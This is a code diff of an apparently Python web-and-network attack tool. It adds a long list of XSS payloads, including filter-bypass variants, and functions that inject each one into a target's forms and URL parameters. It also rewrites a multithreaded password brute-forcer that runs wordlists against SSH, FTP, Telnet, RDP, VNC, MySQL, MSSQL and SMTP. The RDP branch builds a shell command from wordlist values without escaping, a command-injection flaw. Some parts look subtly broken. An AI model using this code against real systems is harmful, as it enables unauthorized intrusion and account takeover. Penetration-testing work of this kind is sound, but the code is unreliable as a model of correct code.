@@ -21,7 +21,7 @@ import pymssql
 
 # HTML parsing and web scraping
 from bs4 import BeautifulSoup
-from urllib.parse import urlparse, urljoin
+from urllib.parse import urlparse, urljoin, quote, parse_qs, urlencode
 
 # Miscellaneous utilities
 import random
@@ -160,7 +160,7 @@ def handle_scan():
                         for result in xss_results:
                             if result["vulnerable"]:
                                 sanitized_payload = escape(result['payload'])
-                                print(Fore.GREEN + f"[+] XSS vulnerability found with payload: {result['payload']}")
+                                #print(Fore.GREEN + f"[+] XSS vulnerability found with payload: {result['payload']}")
                                 results.append({
                                     "url": test_url,
                                     "xss_vulnerability_found": True,
@@ -205,7 +205,18 @@ def handle_scan():
     return jsonify(response)
 
 xss_payloads = [
-    "<script>alert('Hacked')</script>",
+    "<script>alert('Hack')</script>",
+    "<script>alert(document.domain)</script>",
+    '"><script>alert(document.domain)</script>',
+    '" autofocus onfocus="alert(document.domain)',
+    """"autofocus/onfocus="alert(document.domain)""",
+    """'-alert(document.domain)-'""",
+    """\'-alert(document.domain);<!--""",
+    """\'-alert(document.domain);//""",
+    """"};this[8680439..toString(30)](document.domain);//""",
+    "'};this[8680439..toString(30)](document.domain);{'",
+    "';this[8680439..toString(30)](document.domain);//'",
+    "#<script>alert(document.domain)</script>",
     """><svg/onload=prompt(1)>"",
     "<svg/onload=prompt(1)",
     "<script>prompt.call`${1}`</script>",
@@ -215,20 +226,18 @@ xss_payloads = [
     """"><img src=1 onerror=alert(1)>""",
     "p'rompt(1)",
     "<svg><script>prompt&#40;1)</script>",
-    '"><script>alert(document.domain)</script>',
-    '" autofocus onfocus="alert(document.domain)',
     "javascript:alert('XSS')",
-    "';alert('Hacked');//",
+    "';alert('Hack');//",
     "'--><svg onload=alert()>",
     " onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//",
     """ 1/*' or 1 or'" or 1 or"*//*" """,
     """“ onclick=alert(1)//<button value=Click_Me ‘ onclick=alert(1)//> */ alert(1); /*""",
     """/*!SLEEP(1)*/ /*/alert(1)/*/*/""",
     """/*! SLEEP(1) */ /*/ onclick=alert(1)//<button value=Click_Me /**/ or /*! or SLEEP(1) or */ /*/, onclick=alert(1)//> /**/ or /*! or SLEEP(1) or */, onclick=alert(1)// /**/ /**/ /**/""",
-    "<img src=x onerror=alert('Hacked')>",
-    "<svg/onload=alert('Hacked')>",
-    "'<script>alert('Hacked')</script>'",
-    "\"<script>alert('Hacked')</script>\""
+    "<img src=x onerror=alert('Hack')>",
+    "<svg/onload=alert('Hack')>",
+    "'<script>alert('Hack')</script>'",
+    "\"<script>alert('Hack')</script>\""
 ]
 
     
@@ -354,21 +363,27 @@ def submit_xss_payloads_to_forms(url):
         method = form.get('method', 'get').lower()
         form_url = urljoin(url, action)
 
-        inputs = form.find_all('input')
-        form_data = {}
-        for input_tag in inputs:
-            input_name = input_tag.get('name')
-            if input_name:
-                form_data[input_name] = random.choice(xss_payloads)
-        
         for payload in xss_payloads:
+            form_data = {}
+            inputs = form.find_all('input')
+            for input_tag in inputs:
+                input_name = input_tag.get('name')
+                if input_name:
+                    form_data[input_name] = payload
+            
             if method == 'post':
                 r = requests.post(form_url, data=form_data, verify=False, proxies=proxies)
             else:
                 r = requests.get(form_url, params=form_data, verify=False, proxies=proxies)
+                
+            soup = BeautifulSoup(r.text, 'html.parser')
 
             if payload in r.text:
-                print(Fore.GREEN + f"[+] XSS vulnerability found in form with payload: {payload}" + Style.RESET_ALL)
+                print(Fore.GREEN + f"[+] 5XSS vulnerability found in form with payload: {payload}" + Style.RESET_ALL)
+                results.append({"form_action": action, "payload": payload})
+            
+            elif soup.find(string=lambda text: payload in text):
+                print(Fore.GREEN + f"[+] XSS vulnerability found in form. Payload reflected in HTML text content: {payload}" + Style.RESET_ALL)
                 results.append({"form_action": action, "payload": payload})
 
     for container in containers_with_inputs:
@@ -385,8 +400,14 @@ def submit_xss_payloads_to_forms(url):
 
         for payload in xss_payloads:
             r = requests.get(url, params=form_data, verify=False, proxies=proxies)
+            soup = BeautifulSoup(r.text, 'html.parser')
+            
             if payload in r.text:
-                print(Fore.GREEN + f"[+] XSS vulnerability found in container with payload: {payload}")
+                print(Fore.GREEN + f"[+] 6XSS vulnerability found in container with payload: {payload}")
+                results.append({"container": "input_container", "payload": payload})
+            
+            elif soup.find(string=lambda text: payload in text):
+                print(Fore.GREEN + f"[+] XSS payload reflected in HTML text content: {payload}" + Style.RESET_ALL)
                 results.append({"container": "input_container", "payload": payload})
 
     if not results:
@@ -395,7 +416,7 @@ def submit_xss_payloads_to_forms(url):
     return results
 
 
-def get_forms_and_inputs(response, max_attempts=3):
+def get_forms_and_inputs(response):
     """
     Extracts forms and containers with input elements from the HTML response.
 
@@ -418,27 +439,28 @@ def get_forms_and_inputs(response, max_attempts=3):
           with a 1-second delay between each attempt.
         - Returns a dictionary containing the list of forms and containers with input elements.
     """
+    def is_visible(element):
+        """Helper function to check if an element is visible based on style and attributes."""
+        style = element.get('style', '').lower()
+        return (
+            'display:none' not in style and 
+            'hidden' not in element.attrs and 
+            element.get('type') != 'hidden'
+        )
+    
     soup = BeautifulSoup(response.text, 'html.parser')
 
-    forms = soup.find_all('form')
+    forms = []
+    for form in soup.find_all('form'):
+        visible_inputs = [elem for elem in form.find_all(['input', 'textarea', 'button']) if is_visible(elem)]
+        if visible_inputs:
+            forms.append(form)
 
     containers_with_inputs = []
-    containers = soup.find_all(['div', 'section', 'article'])
-    for container in containers:
-        if container.find_all(['input', 'textarea', 'button']):
+    for container in soup.find_all(['div', 'section', 'article']):
+        visible_inputs = [elem for elem in container.find_all(['input', 'textarea', 'button']) if is_visible(elem)]
+        if visible_inputs:
             containers_with_inputs.append(container)
-
-    attempt = 1
-    while not forms and not containers_with_inputs and attempt <= max_attempts:
-        time.sleep(1)
-        soup = BeautifulSoup(response.text, 'html.parser')
-        forms = soup.find_all('form')
-        containers_with_inputs = []
-        containers = soup.find_all(['div', 'section', 'article'])
-        for container in containers:
-            if container.find_all(['input', 'textarea', 'button']):
-                containers_with_inputs.append(container)
-        attempt += 1
 
     result = {
         'forms': forms,
@@ -468,33 +490,42 @@ def exploit_xss_url(url):
     """
     results = []
     
+    parsed_url = urlparse(url)
+    params = parse_qs(parsed_url.query)
+    
+    if not params:
+        params = {"p": ""}
+    
     for payload in xss_payloads:
-        target_url = f"{url}?input={payload}"
+        param_to_inject = list(params.keys())[0]
+        params[param_to_inject] = payload
+        target_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?" + urlencode(params, doseq=True)
+        
         try:
             r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
             
             if payload in r.text:
-                print(Fore.GREEN + f"[+] XSS vulnerability found in URL with payload: {payload}")
+                print(Fore.GREEN + f"[+] 1XSS vulnerability found in URL with payload: {payload}")
                 results.append({"payload": payload, "vulnerable": True})
                 continue
 
             soup = BeautifulSoup(r.text, 'html.parser')
             title = soup.title.string if soup.title else ""
             if "error" in title.lower():
-                print(Fore.GREEN + f"[+] XSS vulnerability found in error message with payload: {payload}"+ Style.RESET_ALL)
+                print(Fore.GREEN + f"[+] 2XSS vulnerability found in error message with payload: {payload}"+ Style.RESET_ALL)
                 results.append({"payload": payload, "vulnerable": True})
                 continue
 
             error_message = soup.find('div', class_='message') or soup.find('div', class_='error')
             if error_message and payload in error_message.text:
-                print(Fore.GREEN + f"[+] XSS vulnerability found in URL with payload: {payload}"+ Style.RESET_ALL)
+                print(Fore.GREEN + f"[+] 3XSS vulnerability found in URL with payload: {payload}"+ Style.RESET_ALL)
                 results.append({"payload": payload, "vulnerable": True})
                 continue
 
-            if any(keyword in r.text.lower() for keyword in ['alert', 'onerror', 'onload']):
-                print(Fore.GREEN + f"[+] XSS vulnerability found in URL with payload: {payload}"+ Style.RESET_ALL)
-                results.append({"payload": payload, "vulnerable": True})
-                continue
+            # if any(keyword in r.text.lower() for keyword in ['alert', 'onerror', 'onload']):
+            #     print(Fore.GREEN + f"[+] 4XSS vulnerability found in URL with payload: {payload}"+ Style.RESET_ALL)
+            #     results.append({"payload": payload, "vulnerable": True})
+            #     continue
 
         except SSLError as e:
             print(f"[-] SSL Error on {target_url}: {e}")
@@ -848,6 +879,7 @@ def scan(target):
     print(nm.csv())
 
     scan_results = []
+    active_services = []
     vulnerabilities_found = False
     filtered_ports = 0
     open_ports = 0
@@ -874,6 +906,8 @@ def scan(target):
                     filtered_ports += 1
                 if state == 'open':
                     open_ports += 1
+                    product = nm[host][proto][port].get('product', '').lower()
+                    active_services.append((product, port))
                     
                 product = nm[host][proto][port].get('product', '')
                 version = nm[host][proto][port].get('version', '')
@@ -899,28 +933,19 @@ def scan(target):
         'vulnerabilities_found': vulnerabilities_found,
         'results': scan_results,
         'filtered_ports': filtered_ports,
-        'open_ports': open_ports
+        'open_ports': open_ports,
+        'active_services': active_services
     }
 
 def start_brute_force(target):
-    max_threads = 10
+    stop_flag = False
+    max_threads = 5
     thread_limiter = threading.BoundedSemaphore(max_threads)
     brute_force_results = []
+    failed_attempts = 0
+    max_failed_attempts = 5
+    failed_attempts_lock = threading.Lock()
 
-    max_failed_attempts_per_service = {
-        'SSH': 10,
-        'FTP': 10,
-        'Telnet': 10,
-        'RDP': 10,
-        'VNC': 10,
-        'MySQL': 10,
-        'MSSQL': 10,
-        'SMTP': 10
-    }
-
-    failed_attempts_per_service = {service: 0 for service in max_failed_attempts_per_service}
-    stop_flag_per_service = {service: False for service in max_failed_attempts_per_service}
-    
     ports_to_test = {
         'SSH': 22,
         'FTP': 21,
@@ -932,295 +957,129 @@ def start_brute_force(target):
         'SMTP': 25
     }
 
-    def service_connect(service_name, username, password, port, max_attempts=10):
-        nonlocal brute_force_results
+    def service_connect(service_name, username, password, port):
+        nonlocal stop_flag, failed_attempts
         result = None
-
-        if stop_flag_per_service[service_name] or failed_attempts_per_service[service_name] >= max_failed_attempts_per_service[service_name]:
-            return  
 
         try:
             if service_name == 'SSH':
-                ssh_attempts = 0
-                while ssh_attempts < max_attempts and not stop_flag_per_service[service_name]:
-                    try:
-                        ssh = paramiko.SSHClient()
-                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                        ssh.connect(target, port=port, username=username, password=password)
-                        print(termcolor.colored(f"[+] Found Password: {password}, For User: {username} on {service_name}", 'green'))
-                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
-                        stop_flag_per_service[service_name] = True
-                        ssh.close()
-                        break
-                    except paramiko.AuthenticationException:
-                        print(termcolor.colored(f"[-] Incorrect Password: {password}, For User: {username} on {service_name}", 'red'))
-                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure'}
-                        failed_attempts_per_service[service_name] += 1
-                        ssh_attempts += 1
-                        time.sleep(1)  
-                    except socket.timeout:
-                        # Manejo específico para tiempo de espera agotado en la conexión
-                        failed_attempts_per_service[service_name] += 1
-                        ssh_attempts += 1
-                        print(termcolor.colored(f"[-] SSH Connection Timed Out for {username}:{password} on {service_name}", 'red'))
-                        time.sleep(2)
-                        if ssh_attempts >= max_attempts:
-                            stop_flag_per_service[service_name] = True
-                            break 
-                    except Exception as e:
-                        print(termcolor.colored(f"[-] SSH Connection Failed: {e}", 'red'))
-                        failed_attempts_per_service[service_name] += 1
-                        ssh_attempts += 1
-                        time.sleep(2)
-                        if ssh_attempts >= max_attempts:
-                            print(termcolor.colored(f"[-] Max password attempts reached for SSH on {target}:{port}", 'red'))
-                            stop_flag_per_service[service_name] = True
-                            break
+                ssh = paramiko.SSHClient()
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                ssh.connect(target, port=port, username=username, password=password)
+                result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
+                print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'green'))
+                ssh.close()
+                stop_flag = True
 
-                if ssh_attempts >= max_attempts:
-                    print(termcolor.colored(f"[-] Max password attempts reached for SSH on {target}:{port}", 'red'))
-                    stop_flag_per_service[service_name] = True
-                    
             elif service_name == 'FTP':
-                ftp_attempts = 0
-                while ftp_attempts < max_attempts and not stop_flag_per_service[service_name]:
-                    try:
-                        with ftplib.FTP() as ftp:
-                            ftp.connect(target, port, timeout=10)
-                            ftp.login(user=username, passwd=password)
-                            print(termcolor.colored(f"[+] Found Password: {password}, For User: {username} on {service_name}", 'green'))
-                            result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
-                            stop_flag_per_service[service_name] = True
-                            ftp.quit()
-                            break
-                    except ftplib.error_perm:
-                        print(termcolor.colored(f"[-] Incorrect Password: {password}, For User: {username} on {service_name}", 'red'))
-                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure'}
-                        failed_attempts_per_service[service_name] += 1
-                        ftp_attempts += 1
-                    
-                    except socket.timeout:
-                        print(termcolor.colored(f"[-] FTP Connection Timed Out for {username}:{password} on {service_name}", 'red'))
-                        failed_attempts_per_service[service_name] += 1
-                        ftp_attempts += 1
-                        time.sleep(2)
-                        if ftp_attempts >= max_attempts:
-                            print(termcolor.colored(f"[-] Max password attempts reached for FTP on {target}:{port}", 'red'))
-                            stop_flag_per_service[service_name] = True
-                            break
-                        
-                    except Exception as e:
-                        print(termcolor.colored(f"[-] FTP Connection Failed: {e}", 'red'))
-                        failed_attempts_per_service[service_name] += 1
-                        ftp_attempts += 1
-                        if ftp_attempts >= max_attempts:
-                            print(termcolor.colored(f"[-] Max password attempts reached for FTP on {target}:{port}", 'red'))
-                            stop_flag_per_service[service_name] = True
-                            break
-
-                if ftp_attempts >= max_attempts:
-                    print(termcolor.colored(f"[-] Max password attempts reached for FTP on {target}:{port}", 'red'))
-                    stop_flag_per_service[service_name] = True 
+                ftp = ftplib.FTP()
+                ftp.connect(target, port)
+                ftp.login(user=username, passwd=password)
+                result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
+                print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'green'))
+                ftp.quit()
+                stop_flag = True  
 
             elif service_name == 'Telnet':
-                telnet_attempts = 0
-                while telnet_attempts < max_attempts and not stop_flag_per_service[service_name]:
-                    try:
-                        with telnetlib.Telnet(target, port, timeout=10) as telnet:
-                            telnet = telnetlib.Telnet(target, port)
-                            telnet.read_until(b"login: ")
-                            telnet.write(username.encode('ascii') + b"\n")
-                            telnet.read_until(b"Password: ")
-                            telnet.write(password.encode('ascii') + b"\n")
-                            print(termcolor.colored(f"[+] Found Password: {password}, For User: {username} on {service_name}", 'green'))
-                            result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
-                            stop_flag_per_service[service_name] = True
-                            telnet.close()
-                            break
-                    except EOFError:
-                        print(termcolor.colored(f"[-] Incorrect Password: {password}, For User: {username} on {service_name}", 'red'))
-                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure'}
-                        failed_attempts_per_service[service_name] += 1
-                        telnet_attempts += 1
-                        
-                    except socket.timeout as e:
-                        # Maneja errores de tiempo de espera explícitamente
-                        print(termcolor.colored(f"[-] Telnet Connection Timed Out: {e}", 'red'))
-                        failed_attempts_per_service[service_name] += 1
-                        telnet_attempts += 1
-                        time.sleep(2)
-                    
-                    except Exception as e:
-                        print(termcolor.colored(f"[-] Telnet Connection Failed: {e}", 'red'))
-                        failed_attempts_per_service[service_name] += 1
-                        telnet_attempts += 1
-                        if telnet_attempts >= max_attempts:  # Si alcanzamos el máximo de intentos fallidos, salimos
-                            print(termcolor.colored(f"[-] Max password attempts reached for Telnet on {target}:{port}", 'red'))
-                            stop_flag_per_service[service_name] = True
-                            break
-
-                if telnet_attempts >= max_attempts:
-                    print(termcolor.colored(f"[-] Max password attempts reached for Telnet on {target}:{port}", 'red'))
-                    stop_flag_per_service[service_name] = True
+                telnet = telnetlib.Telnet(target, port)
+                telnet.read_until(b"login: ")
+                telnet.write(username.encode('ascii') + b"\n")
+                telnet.read_until(b"Password: ")
+                telnet.write(password.encode('ascii') + b"\n")
+                result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
+                print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'green'))
+                telnet.close()
+                stop_flag = True
 
             elif service_name == 'MySQL':
-                mysql_attempts = 0
-                while mysql_attempts < max_attempts and not stop_flag_per_service[service_name]:
-                    try:
-                        db = mysql.connector.connect(
-                            host=target,
-                            user=username,
-                            password=password,
-                            port=port,
-                            connect_timeout=5
-                        )
-                        print(termcolor.colored(f"[+] Found Password: {password}, For User: {username} on {service_name}", 'green'))
-                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
-                        stop_flag_per_service[service_name] = True
-                        db.close()
-                        break
-                    except mysql.connector.Error as e:
-                        # print(termcolor.colored(f"[-] Incorrect Password: {password}, For User: {username} on {service_name}", 'red'))
-                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure', 'error': str(e)}
-                        failed_attempts_per_service[service_name] += 1
-                        mysql_attempts += 1
-                        
-                    except mysql.connector.errors.InterfaceError as e:
-                        if "timed out" in str(e):
-                            print(termcolor.colored(f"[-] MySQL Connection Timed Out for {username}:{password} on {service_name}", 'red'))
-                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure', 'error': str(e)}
-                        failed_attempts_per_service[service_name] += 1
-                        mysql_attempts += 1
-                        time.sleep(2)  # Espera antes del próximo intento
-
-                if mysql_attempts >= max_attempts:
-                    print(termcolor.colored(f"[-] Max password attempts reached for MySQL on {target}:{port}", 'red'))
-                    stop_flag_per_service[service_name] = True
+                db = mysql.connector.connect(
+                    host=target,
+                    user=username,
+                    password=password,
+                    port=port
+                )
+                result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
+                print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'green'))
+                db.close()
+                stop_flag = True
                 
             elif service_name == 'RDP':
                 rdp_attempts = 0
+
                 try:
-                    # Intentos limitados para RDP
-                    while rdp_attempts < max_attempts and not stop_flag_per_service[service_name]:
+                    while rdp_attempts < 10:
                         command = f"xfreerdp /u:{username} /p:{password} /v:{target}:{port} +auth-only"
-                        rdp_result = subprocess.run(command, shell=True, capture_output=True, text=True)
+                        result = subprocess.run(command, shell=True, capture_output=True, text=True)
 
-                        if rdp_result.returncode == 0:
-                            print(termcolor.colored(f"[+] Found Password: {password}, For User: {username} on {service_name}", 'green'))
+                        if result.returncode == 0:
+                            print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'green'))
                             result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
-                            stop_flag_per_service[service_name] = True
-                            break
+                            stop_flag = True
+                            break  
                         else:
-                            # print(termcolor.colored(f"[-] Incorrect Password: {password}, For User: {username} on {service_name}", 'red'))
+                            #print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'red'))
                             result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure'}
-                            failed_attempts_per_service[service_name] += 1
-                            rdp_attempts += 1
+                            rdp_attempts += 1 
 
-                    if rdp_attempts >= max_attempts:
-                        print(termcolor.colored(f"[-] Max password attempts reached for RDP on {target}:{port}", 'red'))
-                        stop_flag_per_service[service_name] = True
-
+                    if rdp_attempts >= 10:
+                        #print(termcolor.colored('[-] Max password attempts reached for RDP', 'red'))
+                        stop_flag = True  
+                        
                 except Exception as e:
                     result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'connection_failed', 'error': str(e)}
-                    print(termcolor.colored(f"[-] RDP Connection Failed: {e}", 'red'))
-                    
-                except subprocess.TimeoutExpired:
-                        print(termcolor.colored(f"[-] RDP Connection Timed Out for {username}:{password} on {service_name}", 'red'))
-                        failed_attempts_per_service[service_name] += 1
-                        rdp_attempts += 1
-                        time.sleep(2)
-                    
-            elif service_name == 'SMTP':
-                smtp_attempts = 0
-                while smtp_attempts < max_attempts and not stop_flag_per_service[service_name]:
-                    try:
-                        smtp_server = smtplib.SMTP(target, port)
-                        smtp_server.starttls()
-                        smtp_server.login(username, password)
-                        print(termcolor.colored(f"[+] Found Password: {password}, For User: {username} on {service_name}", 'green'))
-                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
-                        stop_flag_per_service[service_name] = True
-                        smtp_server.quit()
-                        break
-                    except socket.timeout:
-                        print(termcolor.colored(f"[-] SMTP Connection Timed Out for {username}:{password} on {service_name}", 'red'))
-                        failed_attempts_per_service[service_name] += 1
-                        smtp_attempts += 1
-                        time.sleep(2)
-                    except Exception as e:
-                        # print(termcolor.colored(f"[-] Incorrect Password: {password}, For User: {username} on {service_name}", 'red'))
-                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure', 'error': str(e)}
-                        failed_attempts_per_service[service_name] += 1
-                        smtp_attempts += 1
+                    #print(termcolor.colored(('[-] RDP Connection Failed: ' + str(e)), 'red'))
 
-                if smtp_attempts >= max_attempts:
-                    print(termcolor.colored(f"[-] Max password attempts reached for SMTP on {target}:{port}", 'red'))
-                    stop_flag_per_service[service_name] = True
-                    
-            if service_name == 'VNC':
-                vnc_attempts = 0
-                while vnc_attempts < max_attempts and not stop_flag_per_service[service_name]:
-                    try:
-                        vnc = api.connect(f"{target}:{port}")
-                        vnc.keyPress('password')
-                        print(termcolor.colored(f"[+] Found Password: {password}, For User: {username} on {service_name}", 'green'))
-                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
-                        stop_flag_per_service[service_name] = True
-                        vnc.disconnect()
-                        break
-                    except socket.timeout:
-                        print(termcolor.colored(f"[-] VNC Connection Timed Out for {username}:{password} on {service_name}", 'red'))
-                        failed_attempts_per_service[service_name] += 1
-                        vnc_attempts += 1
-                        time.sleep(2)
-                    except Exception as e:
-                        # print(termcolor.colored(f"[-] Incorrect Password: {password}, For User: {username} on {service_name}", 'red'))
-                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure', 'error': str(e)}
-                        failed_attempts_per_service[service_name] += 1
-                        vnc_attempts += 1
+            elif service_name == 'VNC':
+                try:
+                    vnc = api.connect(f"{target}:{port}")
+                    vnc.keyPress('password')
+                    result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
+                    print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'green'))
+                    vnc.disconnect()
+                    stop_flag = True
+                except Exception as e:
+                    result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure', 'error': str(e)}
+                    #print(termcolor.colored(('[-] VNC Connection Failed: ' + str(e)), 'red'))
 
-                if vnc_attempts >= max_attempts:
-                    print(termcolor.colored(f"[-] Max password attempts reached for VNC on {target}:{port}", 'red'))
-                    stop_flag_per_service[service_name] = True
-            
             elif service_name == 'MSSQL':
-                mssql_attempts = 0
-                while mssql_attempts < max_attempts and not stop_flag_per_service[service_name]:
-                    try:
-                        mssql = pymssql.connect(server=target, port=port, user=username, password=password, timeout=5)
-                        print(termcolor.colored(f"[+] Found Password: {password}, For User: {username} on {service_name}", 'green'))
-                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
-                        stop_flag_per_service[service_name] = True
-                        mssql.close()
-                        break
-                    except pymssql.InterfaceError as e:
-                        if "timed out" in str(e):
-                            print(termcolor.colored(f"[-] MSSQL Connection Timed Out for {username}:{password} on {service_name}", 'red'))
-                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure', 'error': str(e)}
-                        failed_attempts_per_service[service_name] += 1
-                        mssql_attempts += 1
-                        time.sleep(2)
-                    except Exception as e:
-                        # print(termcolor.colored(f"[-] Incorrect Password: {password}, For User: {username} on {service_name}", 'red'))
-                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure', 'error': str(e)}
-                        failed_attempts_per_service[service_name] += 1
-                        mssql_attempts += 1
+                mssql = pymssql.connect(f'DRIVER={{SQL Server}};SERVER={target},{port};UID={username};PWD={password}')
+                result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
+                print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'green'))
+                mssql.close()
+                stop_flag = True
 
-                if mssql_attempts >= max_attempts:
-                    print(termcolor.colored(f"[-] Max password attempts reached for MSSQL on {target}:{port}", 'red'))
-                    stop_flag_per_service[service_name] = True
+            elif service_name == 'SMTP':
+                smtp_server = smtplib.SMTP(target, port)
+                smtp_server.starttls()
+                smtp_server.login(username, password)
+                result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
+                print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'green'))
+                smtp_server.quit()
+                stop_flag = True
 
         except (paramiko.ssh_exception.AuthenticationException, ftplib.error_perm, mysql.connector.errors.ProgrammingError):
             result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure'}
-            failed_attempts_per_service[service_name] += 1
-        
+            #print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'red'))
+            with failed_attempts_lock:
+                failed_attempts += 1
+                if failed_attempts >= max_failed_attempts:
+                    print("The maximum allowed connection attempts has been reached on {service_name}. The system appears secure, as further access could not be obtained.")
+                    stop_flag = True
+                    
         except Exception as e:
             result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'connection_failed', 'error': str(e)}
-            failed_attempts_per_service[service_name] += 1
-
+            #print(termcolor.colored(('[-] Connection Failed: ' + str(e)), 'red'))
+            with failed_attempts_lock:
+                failed_attempts += 1
+            if failed_attempts >= max_failed_attempts:
+                print(f"The maximum allowed connection attempts has been reached on {service_name}. The system appears secure, as further access could not be obtained.")
+                stop_flag = True
+        
         finally:
-            if result is not None and result['status'] == 'success':
-                brute_force_results.append(result)
+            if result is not None:
+                #brute_force_results.append(result)
+                if result['status'] == 'success':
+                    brute_force_results.append(result)
             thread_limiter.release()
 
     usernames_file = "usernamesReal.txt"
@@ -1232,10 +1091,12 @@ def start_brute_force(target):
         sys.exit(1)
 
     print('Starting Force Brute in host ' + target)
+    print("The services that will be evaluated are those that allow login: SSH, FTP, Telnet, RDP, VNC, MySQL, MSSQL, and SMTP.")
+
 
     for service_name, port in ports_to_test.items():
-        stop_flag_per_service[service_name] = False
-        failed_attempts_per_service[service_name] = 0
+        stop_flag = False
+        failed_attempts = 0
         print(f'\nStarting Force Brute in service {service_name} on port {port}')
         
         with open(usernames_file, 'r') as users:
@@ -1244,16 +1105,112 @@ def start_brute_force(target):
                 with open(passwords_file, 'r') as passwords:
                     for password in passwords:
                         password = password.strip()
-                        if stop_flag_per_service[service_name]:
+                        if stop_flag:
                             break
                         thread_limiter.acquire()
                         t = threading.Thread(target=service_connect, args=(service_name, username, password, port))
                         t.start()
                         time.sleep(0.5)
-                if stop_flag_per_service[service_name]:
+                if stop_flag:
                     break
             
     return brute_force_results
+
+
+# def start_brute_force(target):
+#     # Llamada a la función `scan` para obtener los servicios activos
+#     scan_results = scan(target)
+#     active_services = scan_results.get('active_services', [])
+    
+#     if not active_services:
+#         print("No active services found for brute forcing.")
+#         return {'message': 'No active services to brute force.', 'results': []}
+
+#     usernames_file = "usernamesReal.txt"
+#     passwords_file = "passwordsReal.txt"
+#     brute_force_results = []
+#     thread_limiter = threading.BoundedSemaphore(5)  # Límite de hilos concurrentes
+
+#     # Verificar si el archivo de contraseñas existe
+#     if not os.path.exists(passwords_file):
+#         print('[!!] Passwords file not found.')
+#         sys.exit(1)
+
+#     print(f'Starting brute force on host {target}')
+#     for service_name, port in active_services:
+#         stop_flag = False
+#         failed_attempts = 0
+#         print(f'\nStarting brute force on service {service_name} at port {port}')
+
+#         with open(usernames_file, 'r') as users:
+#             for username in users:
+#                 username = username.strip()
+#                 if stop_flag:
+#                     break
+                
+#                 with open(passwords_file, 'r') as passwords:
+#                     for password in passwords:
+#                         password = password.strip()
+#                         if stop_flag:
+#                             break
+
+#                         # Crear y lanzar un hilo por cada intento de fuerza bruta
+#                         thread_limiter.acquire()
+#                         thread = threading.Thread(
+#                             target=try_login,
+#                             args=(service_name, username, password, port, lambda: stop_flag, brute_force_results, thread_limiter)
+#                         )
+#                         thread.start()
+#                         time.sleep(0.5)  # Controlar el intervalo entre intentos
+
+#                 if stop_flag:
+#                     break
+
+#     return {'message': 'Brute force completed', 'results': brute_force_results}
+
+# def try_login(service_name, username, password, port, stop_flag_getter, brute_force_results, thread_limiter):
+#     max_failed_attempts = 5  # Máximo número de intentos fallidos permitidos
+#     failed_attempts = 0
+
+#     try:
+#         if service_name.lower() == 'ftp':
+#             ftp = ftplib.FTP()
+#             ftp.connect('localhost', port, timeout=5)
+#             ftp.login(username, password)
+#             ftp.quit()
+#             print(f"[+] Success: {service_name} - {username}:{password} on port {port}")
+#             brute_force_results.append((service_name, username, password, port))
+#             stop_flag_getter = True  # Detener más intentos en este servicio
+#             return
+
+#         elif service_name.lower() == 'ssh':
+#             ssh = paramiko.SSHClient()
+#             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+#             ssh.connect('localhost', port=port, username=username, password=password, timeout=5)
+#             ssh.close()
+#             print(f"[+] Success: {service_name} - {username}:{password} on port {port}")
+#             brute_force_results.append((service_name, username, password, port))
+#             stop_flag_getter = True  # Detener más intentos en este servicio
+#             return
+        
+#         else:
+#             print(f"[!!] Service {service_name} not supported for brute force.")
+#             stop_flag_getter = True  # Detener intentos si no es soportado
+
+#     except (socket.error, ftplib.error_perm, paramiko.AuthenticationException) as e:
